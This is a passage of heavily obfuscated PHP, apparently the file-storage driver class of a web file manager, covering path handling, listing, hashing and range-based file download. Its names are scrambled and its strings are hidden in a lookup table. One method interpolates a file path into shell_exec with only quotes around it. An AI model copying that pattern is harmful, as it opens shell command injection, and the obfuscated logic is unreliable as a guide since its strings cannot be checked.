$‹ÓÏâ§À; $Â½Ó½È[$¿¯¼ÉË¶ . $ô½¯äı[73] . $†ø¡šª¦ . $ô½¯äı[74] . $Œ¨è€ù] = $‹ÓÏâ§À; $Â½Ó½È[$†ø¡šª¦ . $ô½¯äı[73] . $¿¯¼ÉË¶ . $ô½¯äı[74] . $Œ¨è€ù] = $Œ¨è€ù; return $Œ¨è€ù; } public function getPathInner($ş¥áÙ¦Ÿ) { $Æúë¨” = IO::init($ş¥áÙ¦Ÿ); return $Æúë¨”->path; } public function getPathOuter($”ªÔ‰èª) { $Ÿõã¡Õ =& $_SERVER[ùèÅ´Ãš]; $“Ã†Ö§© = strlen(trim($this->pathBase, $Ÿõã¡Õ[8])); $”ªÔ‰èª = substr(trim($”ªÔ‰èª, $Ÿõã¡Õ[8]), $“Ã†Ö§©); return $this->pathDriver . $Ÿõã¡Õ[8] . ltrim($”ªÔ‰èª, $Ÿõã¡Õ[8]); } public function isParentOf($§éæò±, $Á¼çÖŒœ) { $€öà°Ë½ =& $_SERVER[ùèÅ´Ãš]; $§éæò± = rtrim(strtolower($§éæò±), $€öà°Ë½[8]) . $€öà°Ë½[8]; $Á¼çÖŒœ = rtrim(strtolower($Á¼çÖŒœ), $€öà°Ë½[8]) . $€öà°Ë½[8]; $àÎŞ°‘ = strpos($Á¼çÖŒœ, $§éæò±) === 0; return $àÎŞ°‘; } public function getType() { $¦”Šü =& $_SERVER[ùèÅ´Ãš]; $†Š¤ô·¹ = str_replace($¦”Šü[77], $¦”Šü[12], get_class($this)); return strtolower($†Š¤ô·¹); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($öÒšÂ°º, $¾Ÿğâ¸) { $€Ë¦Åç =& $_SERVER[ùèÅ´Ãš]; $’¹ˆŠ›† = rtrim($öÒšÂ°º, $€Ë¦Åç[8]) . $€Ë¦Åç[8] . $¾Ÿğâ¸; $·÷Ü¥ = $this->exist($’¹ˆŠ›†); return $·÷Ü¥ ? $’¹ˆŠ›† : !1; } public function setModifyTime($²¥òõÇ®, $İœºÏäĞ = '') { } public function renameObject($Œµê–‘â, $îŞÔŞÜÍ) { $ëş ÆŠŠ = $îŞÔŞÜÍ; $Œµê–‘â = $this->getPathOuter($Œµê–‘â); $îŞÔŞÜÍ = $this->pathFather($Œµê–‘â) . $îŞÔŞÜÍ; $È©à¸®è = IO::copy($Œµê–‘â, $this->pathFather($Œµê–‘â), REPEAT_RENAME_FOLDER, $ëş ÆŠŠ); if ($È©à¸®è) { IO::remove($Œµê–‘â); } return $È©à¸®è ? $îŞÔŞÜÍ : !1; } public function tempFile($öç“Å¢ = '', $çŒàô÷ = '') { if (!$öç“Å¢) { $öç“Å¢ = rand_string(15); } $©‰ÑÌš = TEMP_FILES . rand_string(15) . $_SERVER[ùèÅ´Ãš][8]; @mkdir($©‰ÑÌš, DEFAULT_PERRMISSIONS, !0); $£ éİôß = $©‰ÑÌš . $öç“Å¢; @touch($£ éİôß); if ($çŒàô÷) { file_put_contents($£ éİôß, $çŒàô÷); } return $£ éİôß; } public function tempFileRemve($ç‹­½×) { @unlink($ç‹­½×); @rmdir($this->pathFather($ç‹­½×)); } public function mkfile($ÆÇ¢¦¹§, $¹€™–…Ñ = '', $Î³¬éëî = REPEAT_RENAME) { } public function mkdir($Ä¼¤Ì´î, $‹‹Ø·ú = REPEAT_SKIP) { } public function delFile($ö¬×§§) { } public function delFolder($ÅÑ„š‚) { } public function copyFile($ÆËê˜„ñ, $õã¹ğü¼) { } public function moveFile($ÔÔ†ˆ’ , $„Ïßòƒ­) { } public function remove($É±ë’±…) { if ($this->isFile($É±ë’±…)) { return $this->delFile($É±ë’±…); } return $this->delFolder($É±ë’±…); } public function rename($€‡™šû, $ĞÏƒ÷¾ğ) { } public function exist($Ú‰¼å‡) { } public function findByHash($Ë­–¥âá = '', $™ÆÑ–œ© = '') { return !1; } public function isFile($Íó·Ôû) { } public function isFolder($¥İä»Ü˜) { } public function size($¿¢¯è¬) { } public function info($Å§ÒÔ›) { } public function infoSimple($õÜ™àÙ÷) { return $this->info($õÜ™àÙ÷); } public function infoAuth($·Â¤îŸ) { return $this->info($·Â¤îŸ); } public function infoFull($œÆäØì) { return $this->info($œÆäØì); } public function infoFullSimple($¶Ö½ß€á) { return $this->info($¶Ö½ß€á); } public function infoWithChildren($¼òØ‹ŠÚ) { $ÙÈÓ€çİ =& $_SERVER[ùèÅ´Ãš]; static $¡å”İº© = array(); if (isset($¡å”İº©[$¼òØ‹ŠÚ])) { return $¡å”İº©[$¼òØ‹ŠÚ]; } $ñ¨ôÇŸ = $this->info($¼òØ‹ŠÚ); if ($ñ¨ôÇŸ && $ñ¨ôÇŸ[$ÙÈÓ€çİ[33]] == $ÙÈÓ€çİ[78]) { $…§¥Ë = array($ÙÈÓ€çİ[79] => 0, $ÙÈÓ€çİ[80] => 0, $ÙÈÓ€çİ[81] => 0); $this->infoChildren($¼òØ‹ŠÚ, $…§¥Ë); $ñ¨ôÇŸ[$ÙÈÓ€çİ[79]] = $…§¥Ë[$ÙÈÓ€çİ[79]]; $ñ¨ôÇŸ[$ÙÈÓ€çİ[82]] = array($ÙÈÓ€çİ[83] => $…§¥Ë[$ÙÈÓ€çİ[80]], $ÙÈÓ€çİ[84] => $…§¥Ë[$ÙÈÓ€çİ[81]]); $¡å”İº©[$¼òØ‹ŠÚ] = $ñ¨ôÇŸ; } return $ñ¨ôÇŸ; } public function listPath($ƒÜÊŞĞ³, $›ÅÄ‹˜¢ = false) { } public function has($ØÑÌ‚ìÃ, $ÑÓëÖä = false, $‘£æ­âÆ = false) { } public function canRead($±ºÜçÄÇ) { } public function canWrite($É øù­ç) { } public function getContent($”¤ÍÕÍï) { } public function setContent($â¾¥”ƒ÷, $˜™¿™®» = '') { } protected function infoChildren($öËáîÊü, &$Òê÷Øİ­) { $Â÷ùŠİÙ =& $_SERVER[ùèÅ´Ãš]; check_abort_echo(); $‡Àœ¥¦Õ = $this->listPath($öËáîÊü, !0); $‡Àœ¥¦Õ = array_merge($‡Àœ¥¦Õ[$Â÷ùŠİÙ[85]], $‡Àœ¥¦Õ[$Â÷ùŠİÙ[86]]); foreach ($‡Àœ¥¦Õ as $ò° Ú–ë) { if ($ò° Ú–ë[$Â÷ùŠİÙ[33]] == $Â÷ùŠİÙ[78]) { $Òê÷Øİ­[$Â÷ùŠİÙ[81]]++; $Á¡Îè±´ = $this->getPathInner($ò° Ú–ë[$Â÷ùŠİÙ[87]]); $this->infoChildren($Á¡Îè±´, $Òê÷Øİ­); } else { $Òê÷Øİ­[$Â÷ùŠİÙ[80]]++; $Òê÷Øİ­[$Â÷ùŠİÙ[79]] += $ò° Ú–ë[$Â÷ùŠİÙ[79]]; } } } public function fileSubstr($°ÎÄ¿Ÿ†, $ßŞµëƒì, $…èÍ¼¶•) { } public function listAll($ÏÁüÁ¹È) { } public function listAllMake($ÃÍù²Ğ¦, &$ «³ŞÒ) { $¦—îŸÌô =& $_SERVER[ùèÅ´Ãš]; check_abort_echo(); $ÙŞäö— = $this->listPath($ÃÍù²Ğ¦, !0); if (!$ÙŞäö—) { return; } $ÌåŠ—Ó = array_merge($ÙŞäö—[$¦—îŸÌô[85]], $ÙŞäö—[$¦—îŸÌô[86]]); foreach ($ÌåŠ—Ó as $å¤Âşñ§) { $Û»äÔ„• = $å¤Âşñ§[$¦—îŸÌô[33]] == $¦—îŸÌô[78]; $•ÛÜÄÃÙ = array($¦—îŸÌô[87] => $å¤Âşñ§[$¦—îŸÌô[87]], $¦—îŸÌô[78] => $Û»äÔ„•); if (isset($å¤Âşñ§[$¦—îŸÌô[79]])) { $•ÛÜÄÃÙ[$¦—îŸÌô[79]] = $å¤Âşñ§[$¦—îŸÌô[79]]; } if (isset($å¤Âşñ§[$¦—îŸÌô[88]])) { $•ÛÜÄÃÙ[$¦—îŸÌô[88]] = $å¤Âşñ§[$¦—îŸÌô[88]]; } if (!$Û»äÔ„•) { $ «³ŞÒ[] = $•ÛÜÄÃÙ; continue; } $ «³ŞÒ[] = $•ÛÜÄÃÙ; $ŒÁÅß™ = $å¤Âşñ§[$¦—îŸÌô[87]]; $ÀÚß ÔŞ = $this->pathDriver; if (substr($å¤Âşñ§[$¦—îŸÌô[87]], 0, strlen($ÀÚß ÔŞ)) == $ÀÚß ÔŞ) { $ŒÁÅß™ = substr($ŒÁÅß™, strlen($ÀÚß ÔŞ)); } $this->listAllMake($ŒÁÅß™, $ «³ŞÒ); } } public function listAllSimple($ßëùç“, $ã•úßİî = false) { $“ôÛŸı˜ = $this->listAll($ßëùç“); return $this->listAllSimpleMake($“ôÛŸı˜, $this->getPathOuter($ßëùç“), $ã•úßİî); } public function listAllSimpleMake($È–Ä¼ïŸ, $”·ÕåŒ€, $ºÓ½ãÇ) { $ëúòê =& $_SERVER[ùèÅ´Ãš]; $¾üòø²Ò = array(); $”·ÕåŒ€ = rtrim(get_path_father($”·ÕåŒ€), $ëúòê[8]) . $ëúòê[8]; foreach ($È–Ä¼ïŸ as $ÑÛÌÖ›) { $¤¯˜Ê¸Ó = array($ëúòê[87] => $ÑÛÌÖ›[$ëúòê[87]], $ëúòê[89] => $ÑÛÌÖ›[$ëúòê[87]], $ëúòê[78] => $ÑÛÌÖ›[$ëúòê[78]]); if (isset($ÑÛÌÖ›[$ëúòê[79]]) && !$ÑÛÌÖ›[$ëúòê[78]]) { $¤¯˜Ê¸Ó[$ëúòê[79]] = $ÑÛÌÖ›[$ëúòê[79]]; } if (isset($ÑÛÌÖ›[$ëúòê[88]])) { $¤¯˜Ê¸Ó[$ëúòê[88]] = $ÑÛÌÖ›[$ëúòê[88]]; } if (is_array($ÑÛÌÖ›[$ëúòê[90]])) { $¤¯˜Ê¸Ó[$ëúòê[89]] = $ÑÛÌÖ›[$ëúòê[90]][$ëúòê[87]]; $¤¯˜Ê¸Ó[$ëúòê[79]] = $ÑÛÌÖ›[$ëúòê[90]][$ëúòê[79]]; $¤¯˜Ê¸Ó[$ëúòê[88]] = $ÑÛÌÖ›[$ëúòê[90]][$ëúòê[88]]; } else { if (substr($ÑÛÌÖ›[$ëúòê[87]], 0, strlen($”·ÕåŒ€)) == $”·ÕåŒ€) { $¤¯˜Ê¸Ó[$ëúòê[87]] = substr($ÑÛÌÖ›[$ëúòê[87]], strlen($”·ÕåŒ€)); } } $À¿İİÙ = $ÑÛÌÖ›[$ëúòê[78]] ? $ëúòê[8] : $ëúòê[12]; $¤¯˜Ê¸Ó[$ëúòê[89]] = rtrim($¤¯˜Ê¸Ó[$ëúòê[89]], $ëúòê[8]) . $À¿İİÙ; $¤¯˜Ê¸Ó[$ëúòê[87]] = $ëúòê[8] . trim($¤¯˜Ê¸Ó[$ëúòê[87]], $ëúòê[8]) . $À¿İİÙ; if (!$ºÓ½ãÇ) { $ğ ¯‰ù‹ = explode($ëúòê[8], trim($¤¯˜Ê¸Ó[$ëúòê[87]], $ëúòê[8])); $¤¯˜Ê¸Ó[$ëúòê[87]] = $ëúòê[8] . implode($ëúòê[8], array_slice($ğ ¯‰ù‹, 1)) . $À¿İİÙ; } $¾üòø²Ò[] = $¤¯˜Ê¸Ó; } return array_sort_by($¾üòø²Ò, $ëúòê[87]); } public function upload($¡ÌÁ´ãË, $éüË³İ, $—À€ç© = false, $²İÉ˜ÙÂ = REPEAT_REPLACE) { } public function uploadFileByID($ƒ ¿—´ü, $ÏöÉÑÛ, $Ç„­Àú•) { } public function uploadFileByPath($Çæóª×‚, $ßûŒ£–´, $Ø¶ı¼üø = array()) { } public function isUploadServer() { $†îıÄŠõ =& $_SERVER[ùèÅ´Ãš]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $†îıÄŠõ[91]) { return !0; } return $GLOBALS[$†îıÄŠõ[6]][$†îıÄŠõ[92]][$†îıÄŠõ[93]]; } public function isFileOutServer() { $€©ıùÛø =& $_SERVER[ùèÅ´Ãš]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $€©ıùÛø[91]) { return !0; } return $GLOBALS[$€©ıùÛø[6]][$€©ıùÛø[92]][$€©ıùÛø[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($­ö¥¸Ø€) { $’…ßÌ‚ =& $_SERVER[ùèÅ´Ãš]; if (!$this->isCdnHost()) { return $­ö¥¸Ø€; } return str_replace(trim(get_url_root($­ö¥¸Ø€), $’…ßÌ‚[8]), trim($this->cdnHost, $’…ßÌ‚[8]), $­ö¥¸Ø€); } public function uploadLink($ôÚìÀ»Ì, $Öóï–®Ç = 0) { $È˜ŸÆúë =& $_SERVER[ùèÅ´Ãš]; if ($this->isUploadServer()) { return; } $µôí¬ó = $this->getType(); if (!in_array($µôí¬ó, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Íë±‚»À = 1024 * 1024 * 10; $·Á¯ºÃ™ = $Öóï–®Ç <= $Íë±‚»À ? $È˜ŸÆúë[95] : $È˜ŸÆúë[96]; $Ã¨§İÑ = (!$Öóï–®Ç ? 1 : ceil($Öóï–®Ç / pow(1024, 3))) * 3600 * 4; $„ÜßÒ†× = $this->{$·Á¯ºÃ™}($ôÚìÀ»Ì, $Ã¨§İÑ); if ($„ÜßÒ†×) { $„ÜßÒ†×[$È˜ŸÆúë[97]] = $ôÚìÀ»Ì; $„ÜßÒ†×[$È˜ŸÆúë[98]] = $µôí¬ó; } return $„ÜßÒ†×; } public function uploadFormData($‘€¯È™Ü, $¤ñæÔ·« = 3600) { } public function uploadMultiData($ÚòÉÈ­â, $Â¬ùÕÜÅ = 3600) { } public function multiUploadFormData($ìèõàË­, $Ê½¥÷˜« = 3600) { return $this->uploadMultiData($ìèõàË­, $Ê½¥÷˜«); } public function download($ªéÖˆë³, $ÉªÅşÎ¦) { } public function ext($é¤Öº‹©) { $©şÄ×•¬ =& $_SERVER[ùèÅ´Ãš]; if (strpos($é¤Öº‹©, $©şÄ×•¬[8]) === -1) { $ûÃ×íÏ = $é¤Öº‹©; } else { $ûÃ×íÏ = $this->pathThis($é¤Öº‹©); } $¥šşıº¾ = $©şÄ×•¬[12]; if (strstr($ûÃ×íÏ, $©şÄ×•¬[10])) { $¥šşıº¾ = substr($ûÃ×íÏ, strrpos($ûÃ×íÏ, $©şÄ×•¬[10]) + 1); $¥šşıº¾ = strtolower($¥šşıº¾); } if (strlen($¥šşıº¾) > 3 && preg_match($©şÄ×•¬[99], $¥šşıº¾, $®…İõîú)) { $¥šşıº¾ = $©şÄ×•¬[12]; } return $¥šşıº¾; } public function pathThis($‹è¬îĞê) { $ Ï »êô =& $_SERVER[ùèÅ´Ãš]; $‹è¬îĞê = str_replace($ Ï »êô[100], $ Ï »êô[8], rtrim($‹è¬îĞê, $ Ï »êô[8])); $ƒ™¹Ìœ = strrpos($‹è¬îĞê, $ Ï »êô[8]); if ($ƒ™¹Ìœ === !1) { return $‹è¬îĞê; } return substr($‹è¬îĞê, $ƒ™¹Ìœ + 1); } public function pathFather($óœòÆ¨) { $š—¤Êõ· =& $_SERVER[ùèÅ´Ãš]; $óœòÆ¨ = str_replace($š—¤Êõ·[100], $š—¤Êõ·[8], rtrim($óœòÆ¨, $š—¤Êõ·[8])); $Ãİíùç… = strrpos($óœòÆ¨, $š—¤Êõ·[8]); if ($Ãİíùç… === !1) { return $š—¤Êõ·[12]; } return substr($óœòÆ¨, 0, $Ãİíùç… + 1); } public function hashSimple($ö—œĞª§) { $¹óÔ‰Ñ =& $_SERVER[ùèÅ´Ãš]; if (!$ö—œĞª§) { return md5($¹óÔ‰Ñ[12]); } $­á¸Ïöé = $this->size($ö—œĞª§); $ØúÈáı = 200; $Èò£Á« = 50; if ($­á¸Ïöé <= $ØúÈáı * $Èò£Á«) { return $this->hashMd5($ö—œĞª§) . $­á¸Ïöé; } $Ë’¾ß á = intval($­á¸Ïöé / $Èò£Á«); $ØÒº© = $¹óÔ‰Ñ[12]; for ($™ßãŠÜ˜ = 0; $™ßãŠÜ˜ < $Èò£Á«; $™ßãŠÜ˜++) { $ØÒº© .= $this->fileSubstr($ö—œĞª§, $Ë’¾ß á * $™ßãŠÜ˜, $ØúÈáı); } $ØÒº© .= $this->fileSubstr($ö—œĞª§, $­á¸Ïöé - $ØúÈáı, $ØúÈáı); return md5($ØÒº©) . $­á¸Ïöé; } public static $md5Cache = array(); public function hashMd5($º±¥éã) { if (!$º±¥éã) { return md5($_SERVER[ùèÅ´Ãš][12]); } $º±¥éã = $this->iconvSystem($º±¥éã); if (isset(self::$md5Cache[$º±¥éã])) { return self::$md5Cache[$º±¥éã]; } self::$md5Cache[$º±¥éã] = $this->hashMd5Shell($º±¥éã); if (!self::$md5Cache[$º±¥éã]) { self::$md5Cache[$º±¥éã] = @md5_file($º±¥éã); } return self::$md5Cache[$º±¥éã]; } private function hashMd5Shell($«õŠÛ¼õ) { $à»Õû£ =& $_SERVER[ùèÅ´Ãš]; if (!$«õŠÛ¼õ) { return md5($à»Õû£[12]); } if (!function_exists($à»Õû£[101])) { return !1; } $ëõ¯êîá = array($à»Õû£[102], $à»Õû£[103]); $Âïº Ğä = Cache::get($à»Õû£[104]); if (!$Âïº Ğä) { $àúæòŸœ = BASIC_PATH . $à»Õû£[105]; $²Ô´ùè = md5_file($àúæòŸœ); $Âïº Ğä = $à»Õû£[106]; foreach ($ëõ¯êîá as $Ş¡ëë¦™) { $ÍÓÔÃá¤ = shell_exec($Ş¡ëë¦™ . "\x20\42{$àúæòŸœ}\42"); if ($ÍÓÔÃá¤ && substr(trim($ÍÓÔÃá¤), 0, 32) == $²Ô´ùè) { $Âïº Ğä = $Ş¡ëë¦™; break; } } Cache::set($à»Õû£[104], $Âïº Ğä, 3600); } if ($Âïº Ğä == $à»Õû£[106]) { return !1; } $ÍÓÔÃá¤ = shell_exec($Âïº Ğä . "\40\x22{$«õŠÛ¼õ}\42"); $ÍÓÔÃá¤ = str_replace($à»Õû£[107], $à»Õû£[12], $ÍÓÔÃá¤); return substr($ÍÓÔÃá¤, 0, 32); } public function link($é”¢ì• ) { return $é”¢ì• ; } public function fileOut($Ğ­Á“ŒÍ, $ÎôÓş°ç = false, $Ç¹àƒüÛ = false, $‰š±£ì = '') { $¥á˜¹Ûû =& $_SERVER[ùèÅ´Ãš]; $this->cacheMethod(null, null); if (!$Ğ­Á“ŒÍ || !$this->exist($Ğ­Á“ŒÍ)) { show_json(LNG($¥á˜¹Ûû[108]), !1, $Ç¹àƒüÛ); } $¸ÒîâÉÄ = $this->getType() == $¥á˜¹Ûû[109]; $ö¾Á¿Ù× = $GLOBALS[$¥á˜¹Ûû[6]][$¥á˜¹Ûû[92]][$¥á˜¹Ûû[110]][$¥á˜¹Ûû[111]]; $ÄïšÜ°Æ = (double) $GLOBALS[$¥á˜¹Ûû[6]][$¥á˜¹Ûû[92]][$¥á˜¹Ûû[110]][$¥á˜¹Ûû[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ŒòÃõ®Ì = $this->infoFull($Ğ­Á“ŒÍ); $ƒ’Å‘²¤ = $ŒòÃõ®Ì[$¥á˜¹Ûû[79]]; $ÉŸÌ¤î = gmdate($¥á˜¹Ûû[113], $ŒòÃõ®Ì[$¥á˜¹Ûû[88]]); $«ÜŸäı± = $Ç¹àƒüÛ ? $Ç¹àƒüÛ : $this->iconvApp($ŒòÃõ®Ì[$¥á˜¹Ûû[32]]); $¸¸¥ÇÁæ = 0; $¸†©Ô†– = $ƒ’Å‘²¤ - 1; $ÅÆ¡Ø¨ = $this->ext($«ÜŸäı±); if (in_array($ÅÆ¡Ø¨, array($¥á˜¹Ûû[114], $¥á˜¹Ûû[115], $¥á˜¹Ûû[116], $¥á˜¹Ûû[117]))) { $ÅÆ¡Ø¨ = $¥á˜¹Ûû[118]; } if (in_array($ÅÆ¡Ø¨, array($¥á˜¹Ûû[119]))) { $ÅÆ¡Ø¨ = $¥á˜¹Ûû[120]; } if (!$‰š±£ì) { $‰š±£ì = md5($ÉŸÌ¤î . $ƒ’Å‘²¤); } $‰š±£ì = $¥á˜¹Ûû[121] . $‰š±£ì . $¥á˜¹Ûû[121]; $Ü“Ï›ì’ = get_file_mime($ÅÆ¡Ø¨); $Ø—Ñã­ı = !0; $Ø—Ñã­ı = isset($_GET[$¥á˜¹Ûû[122]]) ? !1 : !0; if ($ÎôÓş°ç === !1 && !mime_support($Ü“Ï›ì’)) { $Ü“Ï›ì’ = $¥á˜¹Ûû[123]; } header($¥á˜¹Ûû[124]); header($¥á˜¹Ûû[125] . $Ü“Ï›ì’); $Î¡…­³Ä = rawurlencode($«ÜŸäı±); $Î¡…­³Ä = $¥á˜¹Ûû[121] . $Î¡…­³Ä . $¥á˜¹Ûû[126] . $Î¡…­³Ä; if ($ÎôÓş°ç) { header($¥á˜¹Ûû[127]); header($¥á˜¹Ûû[128] . $Î¡…­³Ä); } else { if ($Ø—Ñã­ı) { header($¥á˜¹Ûû[129] . $Î¡…­³Ä); } } $§›Ï´Ó® = 3600 * 24 * 30; header($¥á˜¹Ûû[130]); header($¥á˜¹Ûû[131]); header($¥á˜¹Ûû[132] . $§›Ï´Ó®); header($¥á˜¹Ûû[133] . gmdate($¥á˜¹Ûû[113], time() + $§›Ï´Ó®) . $¥á˜¹Ûû[134]); if (isset($_SERVER[$¥á˜¹Ûû[135]]) && strtotime($_SERVER[$¥á˜¹Ûû[135]]) == $ŒòÃõ®Ì[$¥á˜¹Ûû[88]]) { header($¥á˜¹Ûû[136], !0, 304); die; } if (isset($_SERVER[$¥á˜¹Ûû[137]]) && $_SERVER[$¥á˜¹Ûû[137]] == $‰š±£ì) { header($¥á˜¹Ûû[138] . $‰š±£ì, !0, 304); die; } header($¥á˜¹Ûû[138] . $‰š±£ì); header($¥á˜¹Ûû[139] . $ÉŸÌ¤î . $¥á˜¹Ûû[134]); header($¥á˜¹Ûû[140] . $«ÜŸäı±); header($¥á˜¹Ûû[141]); header($¥á˜¹Ûû[142] . $ƒ’Å‘²¤); header($¥á˜¹Ûû[143]); Hook::trigger($¥á˜¹Ûû[144], $Ğ­Á“ŒÍ, $ƒ’Å‘²¤, $«ÜŸäı±, $ÅÆ¡Ø¨); if (!$ÎôÓş°ç && $ÅÆ¡Ø¨ == $¥á˜¹Ûû[145]) { if ($ƒ’Å‘²¤ > 1024 * 1024 * 10) { die; } $éÔ¶¸â = $this->getContent($Ğ­Á“ŒÍ); $éÔ¶¸â = Html::clearSVG($éÔ¶¸â); header($¥á˜¹Ûû[146] . strlen($éÔ¶¸â)); echo $éÔ¶¸â; die; } $óÈ‘Õàƒ = strtolower($_SERVER[$¥á˜¹Ûû[147]]); if ($¸ÒîâÉÄ && $óÈ‘Õàƒ && $ö¾Á¿Ù×) { if (strstr($óÈ‘Õàƒ, $¥á˜¹Ûû[148])) { header($¥á˜¹Ûû[149] . $Ğ­Á“ŒÍ); } else { if (strstr($óÈ‘Õàƒ, $¥á˜¹Ûû[150])) { header($¥á˜¹Ûû[151] . $Ğ­Á“ŒÍ); } else { if (strstr($óÈ‘Õàƒ, $¥á˜¹Ûû[152])) { header($¥á˜¹Ûû[153] . $Ğ­Á“ŒÍ); } } } if ($ÄïšÜ°Æ) { header($¥á˜¹Ûû[154] . $ÄïšÜ°Æ); } return; } if (isset($_SERVER[$¥á˜¹Ûû[155]])) { if (preg_match($¥á˜¹Ûû[156], $_SERVER[$¥á˜¹Ûû[155]], $¼º£°‹®)) { $¸¸¥ÇÁæ = intval($¼º£°‹®[1]); $¸¸¥ÇÁæ = $¸¸¥ÇÁæ <= 0 ? 0 : ($¸¸¥ÇÁæ >= $¸†©Ô†– ? $¸†©Ô†– : $¸¸¥ÇÁæ); if (!empty($¼º£°‹®[2])) { $Ñ‹çì› = intval($¼º£°‹®[2]); $¸†©Ô†– = $Ñ‹çì› < $¸¸¥ÇÁæ ? $¸¸¥ÇÁæ : ($Ñ‹çì› >= $¸†©Ô†– ? $¸†©Ô†– : $Ñ‹çì›); } } header($¥á˜¹Ûû[157]); header("\x43\157\x6e\x74\145\x6e\164\55\x52\x61\156\x67\x65\72\40\x62\x79\x74\x65\163\40{$¸¸¥ÇÁæ}\x2d{$¸†©Ô†–}\57" . $ƒ’Å‘²¤); } else { header($¥á˜¹Ûû[158]); } header($¥á˜¹Ûû[159]); header($¥á˜¹Ûû[160]); $—Ûö¢¥É = !0; if ($_SERVER[$¥á˜¹Ûû[161]] == $¥á˜¹Ûû[162] && $ƒ’Å‘²¤ > 1204 * 1024 * 1024 * 2) { $—Ûö¢¥É = !1; } if ($—Ûö¢¥É) { header($¥á˜¹Ûû[163] . ($¸†©Ô†– - $¸¸¥ÇÁæ + 1)); } if ($_SERVER[$¥á˜¹Ûû[164]] == $¥á˜¹Ûû[165]) { return; } $é¬®­Ù° = array($¥á˜¹Ûû[166] => !1, $¥á˜¹Ûû[167] => $¸¸¥ÇÁæ, $¥á˜¹Ûû[168] => $¸†©Ô†–, $¥á˜¹Ûû[169] => $ÅÆ¡Ø¨, $¥á˜¹Ûû[170] => $ŒòÃõ®Ì, $¥á˜¹Ûû[171] => $¥á˜¹Ûû[12], $¥á˜¹Ûû[172] => 0); $é¬®­Ù° = Hook::filter($¥á˜¹Ûû[173], $é¬®­Ù°); $ıë¤²ˆ† = 1024 * 300; $Ò—óĞ¿¹ = 0; if ($ÄïšÜ°Æ) { $Ò—óĞ¿¹ = intval(1000 * 1000 * ($ıë¤²ˆ† / $ÄïšÜ°Æ)); } while ($¸¸¥ÇÁæ <= $¸†©Ô†–) { $ù¹áÈÜ¯ = timeFloat(); check_abort(); $œ¾€äšó = $¸†©Ô†– - $¸¸¥ÇÁæ + 1; if ($œ¾€äšó <= $ıë¤²ˆ†) { $ıë¤²ˆ† = $œ¾€äšó; } $éÔ¶¸â = $this->fileSubstr($Ğ­Á“ŒÍ, $¸¸¥ÇÁæ, $ıë¤²ˆ†); if ($é¬®­Ù°[$¥á˜¹Ûû[166]]) { $é¬®­Ù°[$¥á˜¹Ûû[171]] = $éÔ¶¸â; $é¬®­Ù°[$¥á˜¹Ûû[172]] = $¸¸¥ÇÁæ; $é¬®­Ù° = Hook::filter($¥á˜¹Ûû[174], $é¬®­Ù°); $éÔ¶¸â = $é¬®­Ù°[$¥á˜¹Ûû[171]]; } echo $éÔ¶¸â; $¸¸¥ÇÁæ += $ıë¤²ˆ†; if ($ıë¤²ˆ† == $œ¾€äšó) { $¸¸¥ÇÁæ = $¸†©Ô†– + 1; } if ($Ò—óĞ¿¹) { $ÆçÕ¢£‰ = intval(1000 * 1000 * (timeFloat() - $ù¹áÈÜ¯)); $Ç›Öá¼‚ = $Ò—óĞ¿¹ - $ÆçÕ¢£‰; if ($Ç›Öá¼‚ > 5) { usleep($Ç›Öá¼‚); } } } } public function fileOutServer($â¿¯æ¬ß, $ØÕÔŠıà = false, $ÀÌö†¼µ = false, $Œ¯Ğ½öí = '') { $this->fileOut($â¿¯æ¬ß, $ØÕÔŠıà, $ÀÌö†¼µ, $Œ¯Ğ½öí); } public function fileOutLink($±‹”²øş) { header($_SERVER[ùèÅ´Ãš][175] . $±‹”²øş); die; } public function cacheMethod($¼å»äÂ, $ÕÑß…Ç„, $½—ñ„Áú = null) { $á¹ç˜£« =& $_SERVER[ùèÅ´Ãš]; static $Êš‚ĞÒ× = array(); $ÇÚ¿¦Û = $ÕÑß…Ç„ ? ltrim($this->getPathOuter($ÕÑß…Ç„), $á¹ç˜£«[8]) : $á¹ç˜£«[12]; $Ú›é‘²Ä = $á¹ç˜£«[176] . $¼å»äÂ . $á¹ç˜£«[177] . rtrim($ÇÚ¿¦Û, $á¹ç˜£«[8]); if (is_null($¼å»äÂ)) { $Êš‚ĞÒ× = array(); return; } if (is_null($ÕÑß…Ç„)) { foreach ($Êš‚ĞÒ× as $Ú›é‘²Ä => $¸´´¯Ê‹) { if (!strstr($Ú›é‘²Ä, $á¹ç˜£«[176] . $¼å»äÂ . $á¹ç˜£«[178])) { continue; } unset($Êš‚ĞÒ×[$Ú›é‘²Ä]); } return; } if ($½—ñ„Áú === $á¹ç˜£«[179]) { unset($Êš‚ĞÒ×[$Ú›é‘²Ä]); return; } if (!is_null($½—ñ„Áú)) { $Êš‚ĞÒ×[$Ú›é‘²Ä] = $½—ñ„Áú; return; } $®¦†ØÁ¡ = isset($Êš‚ĞÒ×[$Ú›é‘²Ä]) ? $Êš‚ĞÒ×[$Ú›é‘²Ä] : null; if (!is_null($®¦†ØÁ¡)) { return $®¦†ØÁ¡; } $®¦†ØÁ¡ = $this->{$¼å»äÂ}($ÕÑß…Ç„); $Êš‚ĞÒ×[$Ú›é‘²Ä] = $®¦†ØÁ¡; return $®¦†ØÁ¡; } public function cacheMethodInfoSet($Å„¥¾€Ğ, $ş”Ä™²œ, $ø­èû†Ã = false) { $üæ¼ÀÎ¢ =& $_SERVER[ùèÅ´Ãš]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($üæ¼ÀÎ¢[180], $Å„¥¾€Ğ, $ş”Ä™²œ); $this->cacheMethod($üæ¼ÀÎ¢[181], $Å„¥¾€Ğ, $ş”Ä™²œ ? !1 : !0); if (is_array($ø­èû†Ã)) { $this->cacheMethod($üæ¼ÀÎ¢[182], $Å„¥¾€Ğ, $ø­èû†Ã); } } public function fileOutImage($á˜æ´ÓÎ, $ßÀô‰â‚ = 250) { $¾ùÀĞ¼ =& $_SERVER[ùèÅ´Ãš]; set_timeout(); if (substr($á˜æ´ÓÎ, 0, 4) == $¾ùÀĞ¼[152]) { $this->fileOutLink($á˜æ´ÓÎ); } $Àôê…š” = $this->info($á˜æ´ÓÎ); $Â–¬ú…” = !1; 